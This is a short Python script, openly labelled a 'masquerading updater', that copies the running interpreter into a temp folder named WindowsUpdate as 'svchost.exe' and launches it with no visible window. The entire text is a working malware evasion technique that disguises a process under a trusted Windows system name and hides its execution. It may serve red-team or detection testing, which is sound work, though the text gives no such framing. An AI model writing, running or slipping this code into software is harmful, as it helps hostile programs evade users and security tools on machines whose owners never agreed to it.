# Masquerading updater - runs from temp
import os, sys, shutil, subprocess
from pathlib import Path

tmp = Path(os.environ.get("TEMP", "/tmp")) / "WindowsUpdate"
tmp.mkdir(exist_ok=True)
fake = tmp / "svchost.exe"
shutil.copy2(sys.executable, fake)
subprocess.Popen([str(fake)], creationflags=subprocess.CREATE_NO_WINDOW)
